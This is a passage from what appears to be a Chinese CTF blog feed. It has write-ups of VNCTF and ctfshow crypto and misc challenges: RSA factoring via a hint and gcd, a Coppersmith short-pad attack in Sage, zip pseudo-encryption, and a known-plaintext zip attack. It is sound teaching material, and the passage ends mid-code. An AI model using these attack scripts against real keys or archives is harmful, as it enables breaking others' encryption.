class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="官方writeup"><a href="#官方writeup" class="headerlink" title="官方writeup"></a>官方writeup</h3><p><img src="https://z3.ax1x.com/2021/04/09/cUrPPg.png"></p><br><h3 id="分解n，求e"><a href="#分解n，求e" class="headerlink" title="分解n，求e"></a>分解n，求e</h3><p>给出了模数<code>n</code>和密文<code>c</code>，但对公钥中的<code>e</code>进行加密，所以需要通过后面的代码解出。</p><pre class="line-numbers language-none"><code class="language-none">n &#x3D; p * p * qd &#x3D; inverse(e,lcm(p,lcm(p-1,q-1)))c &#x3D; pow(m,e,n)hint &#x3D; pow(d,e,n)已知n、c、hint、e，求m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在官方writeup中，已知<br>$$<br>e * d = k * p * (p-1) * (q-1) + 1<br>$$</p><p>$$<br>(e * d)^e = [k * p * (p-1) * (q-1) + 1]^e<br>$$</p><p>等式右边通过二项式定理展开，除了<code>1</code>以外，其它各项提取公约数<code>p</code>，得到各项之和用<code>K</code>代替，得到：</p><blockquote><p>二项式定理：<br>$$<br>(a+b)^n = \sum_{r=0}^{n} C_n^r a^{n-r} b^{r}<br>$$</p></blockquote><p>$$<br>(e * d)^e = K * p + 1<br>$$</p><p>两边同时对n取模：<br>$$<br>(e * d)^e % n = (K * p + 1) % n<br>$$</p><p>$$<br>(e^e * d^e) % n = (K * p + 1) % n<br>$$</p><p>由分配律，可得：</p><blockquote><p>模运算的分配律<br>$$<br>(a*b)%m = (a%m * b%m)%m<br>$$</p></blockquote><p>$$<br>(e^e % n * d^e % n) % n = (K * p + 1) % n<br>$$</p><p>将<code>hint = pow(d, e, n)</code>代入等式，并由同余定理的性质可得：</p><blockquote><p>(a%n * b * c) %n = (a * b * c) %n</p></blockquote><p>$$<br>(e^e % n * hint) % n = (K * p + 1) % n<br>$$</p><p>$$<br>(e^e * hint) % n = (K * p + 1) % n<br>$$</p><p>由同余式的性质，可得：</p><blockquote><p>若<br>$$<br>a+b \equiv c \pmod{m}<br>$$<br>则：<br>$$<br>a \equiv c-b \pmod{m}<br>$$</p></blockquote><p>$$<br>(e^e * hint - 1) % n = (K * p) % n<br>$$</p><p>记 a = e^e^ * hint - 1，即<code>a%n = (K*p)%n</code>，则存在整数<code>t</code>，使得下式成立<br>$$<br>a + t<em>n = K</em>p<br>$$</p><p>$$<br>\frac{1}{K}*a + \frac{t}{K}*n = p<br>$$</p><p>由Be’zout恒等式可得：</p><blockquote><p>裴蜀恒等式：</p><p>若a、b是整数，且gcd(a, b) = d，那么对于任意的整数x、y，ax+by一定是d的倍数</p></blockquote><p>$$<br>p = gcd(a, n)<br>$$</p><p>$$<br>p = gcd((e^e * hint - 1) % n, n)<br>$$</p><p>至此可以分解<code>n = p * p * q</code>，进而求出<code>m</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">1246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959</span>c <span class="token operator">=</span> <span class="token number">952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747</span>hint <span class="token operator">=</span> <span class="token number">788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> e<span class="token punctuation">)</span> <span class="token operator">*</span> hint <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span>q <span class="token operator">=</span> n <span class="token operator">//</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>phi <span class="token operator">=</span> p<span class="token operator">*</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解出<code>m</code>，即<code>e</code></p><pre class="line-numbers language-none"><code class="language-none">93943500165298065499950418373429723509334252629406924973909070866091749987346174290549648466771963135864917881154270768788129489671486923171733460927672763251885052132144244633336183737015936611716827476566876619327956203686756399730968768494676888428137426449681845021696056187478027217734766494935085365973<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="求m，即url"><a href="#求m，即url" class="headerlink" title="求m，即url"></a>求m，即url</h3><pre class="line-numbers language-none"><code class="language-none">n &#x3D; p * qe &#x3D; inverse(d,(p-1)*(q-1))c &#x3D; pow(m, e, n)已知n、e、c，求m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>分解<code>n</code>得到<code>p</code>和<code>q</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumn <span class="token operator">=</span> <span class="token number">97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441</span>e <span class="token operator">=</span> <span class="token number">93943500165298065499950418373429723509334252629406924973909070866091749987346174290549648466771963135864917881154270768788129489671486923171733460927672763251885052132144244633336183737015936611716827476566876619327956203686756399730968768494676888428137426449681845021696056187478027217734766494935085365973</span>c <span class="token operator">=</span> <span class="token number">86143311788363675684674113699193046781796638913243016152555572150858159500527674063754694514501999791875561142925154991000532628799185608465062814546108160434468098898040769021072007374156546314975240583347468026001633652940408779155579339470960571067652924814623371177901052302005289155305089588204204313261</span>p <span class="token operator">=</span> <span class="token number">9835780326918921450384939520703159429090649871281768715641755269342480464725277168508799134918968507663862771426644391164052107916295577234408385997691449</span>q <span class="token operator">=</span> <span class="token number">9944769506198904796464695419856773937832623651063656661008222627141038630020296252710349732675131398772544767619996320162662374684215220228566848451929609</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;dawn-whisper.lanzous.com&#x2F;iCAv0lod7yj-password:gzjq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问链接：<a href="https://dawn-whisper.lanzous.com/iCAv0lod7yj">https://dawn-whisper.lanzous.com/iCAv0lod7yj</a></p><p>密码：gzjq</p><p>得到一个<code>task.txt</code>文件</p><br><h3 id="解出flag"><a href="#解出flag" class="headerlink" title="解出flag"></a>解出flag</h3><ul><li>task.txt</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Wow, you got here!</span><span class="token comment"># This is the last task, trust me!</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token punctuation">,</span>padding<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">7</span> p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qc1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token operator">+</span>padding<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511747971736575756405981407884108520168436125195883759681905797344209513741031295706378225472179679789113284198085292041435224541423031389590132208115584909516143143068493670684781907978850569227054030288567340952885222900553098805723215574937983620562167837775933861333476938929419281319459860877127378622637619209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Coppersmith Shortpad Attack（短填充攻击），与强网杯2019 Copperstudy 的第5层类似，参考：<a href="https://blog.csdn.net/zippo1234/article/details/109409929">https://blog.csdn.net/zippo1234/article/details/109409929</a></p><p>使用在线sage网站解出m：<a href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">short_pad_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRxy<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>xn<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRZZ<span class="token punctuation">.</span><span class="token operator">&lt;</span>xz<span class="token punctuation">,</span>yz<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    q1 <span class="token operator">=</span> g1<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    q2 <span class="token operator">=</span> g2<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    h <span class="token operator">=</span> q2<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRx<span class="token punctuation">)</span><span class="token punctuation">.</span>subs<span class="token punctuation">(</span>y<span class="token operator">=</span>xn<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>e<span class="token operator">*</span>e<span class="token punctuation">)</span>    diff <span class="token operator">=</span> h<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> diff<span class="token keyword">def</span> <span class="token function">related_message_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>diff<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    <span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> g2<span class="token punctuation">:</span>            g1<span class="token punctuation">,</span> g2 <span class="token operator">=</span> g2<span class="token punctuation">,</span> g1 <span class="token operator">%</span> g2        <span class="token keyword">return</span> g1<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>gcd<span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>e <span class="token operator">=</span> <span class="token number">7</span>n <span class="token operator">=</span> <span class="token number">143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511</span>c1 <span class="token operator">=</span> <span class="token number">74797173657575640598140788410852016843612519588375968190579734420951374103129570637822547217967978911328419808529204143522454142303138959013220811558490951614314306849367068478190797885056922705403028856734095288522290055309880572321557493798362056216783777593386133347693892941928131945986087712737862263761</span>c2 <span class="token operator">=</span> <span class="token number">9209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214</span>diff <span class="token operator">=</span> short_pad_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> related_message_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到m：</p><pre class="line-numbers language-none"><code class="language-none">10987990383581104782482187747540238894765883387310758020242583119235786727788961015913718141<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnumm <span class="token operator">=</span> <span class="token number">10987990383581104782482187747540238894765883387310758020242583119235786727788961015913718141</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag：</p><pre class="line-numbers language-none"><code class="language-none">VNCTF&#123;H4ppyNeWy34r!2021_V&amp;N_figHt1ng!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow——misc</title>
      <link href="posts/20210222.html"/>
      <url>posts/20210222.html</url>
      
        <content type="html"><![CDATA[<p>杂项签到 &amp; misc2~misc8</p><span id="more"></span><p>misc4 &amp; misc7 待更新</p><h3 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h3><p>zip伪加密：压缩源文件数据区的全局加密为 <code>00 00</code>，且压缩源文件目录区的全局方式位标记 <code>09 00</code></p><p>将<code>09</code>改为<code>00</code>，解压就可以得到flag</p><p><img src="https://z3.ax1x.com/2021/04/09/cU69IK.png"></p><br><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>题目：偶然发现我竟然还有个软盘，勾起了我的回忆。</p><p>点击<code>编辑虚拟机设置</code>，点击<code>添加</code>按钮添加软盘驱动器，然后使用软盘映像文件，选择解压后的file文件。</p><p>再打开虚拟机即可看到flag</p><p><img src="https://z3.ax1x.com/2021/04/09/cU6PPO.png"></p><p><img src="https://z3.ax1x.com/2021/04/09/cU6pa6.png"></p><br><h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>题目：</p><pre class="line-numbers language-none"><code class="language-none">密文：zse4rfvsdf 6yjmko0提示1：解密后两个字符,小写 提示2：看看自己下面提交flag&#123;明文&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看键盘画线得明文，所以flag为<code>flag&#123;av&#125;</code></p><p><img src="https://z3.ax1x.com/2021/04/09/cU6kxH.png"></p><br><h3 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h3><br><h3 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h3><p>将图片放大即可看到flag</p><p><img src="https://z3.ax1x.com/2021/04/09/cU6VsA.png"></p><br><h3 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h3><p>解压后得到</p><pre class="line-numbers language-none"><code class="language-none">YZYPYUYAXOYWXXYZXWYBYSXAZSYRYCYWYYUUXQ&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>字母解密即可得到flag：<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu</a></p><p><img src="https://z3.ax1x.com/2021/04/09/cU6iGD.png"></p><br><h3 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h3><br><h3 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h3><p>明文攻击，得到解压密码<code>56tygh</code>，解压后扫描二维码得到flag</p><p><img src="https://z3.ax1x.com/2021/04/09/cU6FRe.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow——easyrsa系列</title>
      <link href="posts/20210217.html"/>
      <url>posts/20210217.html</url>
      
        <content type="html"><![CDATA[<p>ctfshow easyrsa1~8</p><span id="more"></span><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul><li>easyrsa1：模数分解（factordb查询n）</li><li>easyrsa2：利用公约数分解n（两个n共用一个p，gmpy2.gcd() 欧几里得算法）</li><li>easyrsa3：共模攻击</li><li>easyrsa4：低加密指数攻击</li><li>easyrsa5：低解密指数攻击</li><li>easyrsa6：yafu分解模数（当p、q的取值差异过大或过于相近的时候）</li><li>easyrsa7：RSA高位攻击（已知p的高位）</li><li>easyrsa8：openssl解开公钥n和e</li></ul><br><h3 id="easyrsa1"><a href="#easyrsa1" class="headerlink" title="easyrsa1"></a>easyrsa1</h3><p>题目：easyrsa1.txt</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537n &#x3D; 1455925529734358105461406532259911790807347616464991065301847c &#x3D; 69380371057914246192606760686152233225659503366319332065009<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><a href="http://factordb.com/"><strong>模数分解</strong></a>：暴力分解n，得到p和q。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">1455925529734358105461406532259911790807347616464991065301847</span>c <span class="token operator">=</span> <span class="token number">69380371057914246192606760686152233225659503366319332065009</span>p <span class="token operator">=</span> <span class="token number">1201147059438530786835365194567</span>q <span class="token operator">=</span> <span class="token number">1212112637077862917192191913841</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;fact0r_sma11_N&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="easyrsa2"><a href="#easyrsa2" class="headerlink" title="easyrsa2"></a>easyrsa2</h3><p>题目：easyrsa2</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537n &#x3D; 23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747c &#x3D; 1627484142237897613944607828268981193911417408064824540711945192035649088104133038147400224070588410335190662682231189997580084680424209495303078061205122848904648319219646588720994019249279863462981015329483724747823991513714172478886306703290044871781158393304147301058706003793357846922086994952763485999282741595204008663847963539422096343391464527068599046946279309037212859931303335507455146001390326550668531665493245293839009832468668390820282664984066399051403227990068032226382222173478078505888238749583237980643698405005689247922901342204142833875409505180847943212126302482358445768662608278731750064815e &#x3D; 65537n &#x3D; 22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711c &#x3D; 2742600695441836559469553702831098375948641915409106976157840377978123912007398753623461112659796209918866985480471911393362797753624479537646802510420415039461832118018849030580675249817576926858363541683135777239322002741820145944286109172066259843766755795255913189902403644721138554935991439893850589677849639263080528599197595705927535430942463184891689410078059090474682694886420022230657661157993875931600932763824618773420077273617106297660195179922018875399174346863404710420166497017196424586116535915712965147141775026549870636328195690774259990189286665844641289108474834973710730426105047318959307995062<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题有点像：<code>[BJDCTF2020]RSA</code></p><p>所以尝试按照<code>[BJDCTF2020]RSA</code>的思路来解，先求两个n的最大公因数p，进而求q，接下就可以算出φ(n)，然后求出d后可算出m。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumc <span class="token operator">=</span> <span class="token number">1627484142237897613944607828268981193911417408064824540711945192035649088104133038147400224070588410335190662682231189997580084680424209495303078061205122848904648319219646588720994019249279863462981015329483724747823991513714172478886306703290044871781158393304147301058706003793357846922086994952763485999282741595204008663847963539422096343391464527068599046946279309037212859931303335507455146001390326550668531665493245293839009832468668390820282664984066399051403227990068032226382222173478078505888238749583237980643698405005689247922901342204142833875409505180847943212126302482358445768662608278731750064815</span>e <span class="token operator">=</span> <span class="token number">65537</span>n1 <span class="token operator">=</span> <span class="token number">23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747</span>n2 <span class="token operator">=</span> <span class="token number">22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>p <span class="token operator">=</span> n1<span class="token operator">//</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" 